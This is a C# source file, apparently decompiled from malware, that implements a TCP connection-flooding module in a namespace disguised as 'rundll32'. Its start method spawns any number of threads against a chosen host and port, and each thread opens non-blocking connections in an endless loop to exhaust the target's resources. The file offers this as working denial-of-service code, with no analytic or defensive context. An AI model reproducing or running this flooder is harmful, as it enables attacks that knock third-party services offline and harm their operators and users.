using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace rundll32.floods;

internal class tcp
{
	internal class TcpFloodingthreads
	{
		private IPEndPoint _ep;

		private Thread _thisThread;

		public TcpFloodingthreads(IPEndPoint ep)
		{
			_ep = ep;
			_thisThread = new Thread(_threadLoop);
			_thisThread.Start();
		}

		public void stopshit()
		{
			try
			{
				_thisThread.Suspend();
			}
			catch
			{
			}
		}

		private void _threadLoop()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.Blocking = false;
						AsyncCallback callback = OnConnect;
						socket.BeginConnect(_ep, callback, socket);
						Thread.Sleep(_MSDelay);
					}
				}
				catch
				{
				}
			}
		}

		private static void OnConnect(IAsyncResult ar)
		{
		}
	}

	private static List<TcpFloodingthreads> _floods = new List<TcpFloodingthreads>();

	public static bool IsOn = false;

	public static int _MSDelay;

	public static bool start(string host, int port, int threads, int delay)
	{
		if (!IsOn)
		{
			IsOn = true;
			_MSDelay = delay;
			IPEndPoint ep;
			try
			{
				ep = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
			}
			catch
			{
				ep = new IPEndPoint(IPAddress.Parse(host), port);
			}
			IsOn = true;
			for (int i = 0; i < threads; i++)
			{
				_floods.Add(new TcpFloodingthreads(ep));
			}
			return true;
		}
		return false;
	}

	public static bool stop()
	{
		if (IsOn)
		{
			IsOn = false;
			foreach (TcpFloodingthreads flood in _floods)
			{
				flood.stopshit();
			}
			return true;
		}
		return false;
	}
}
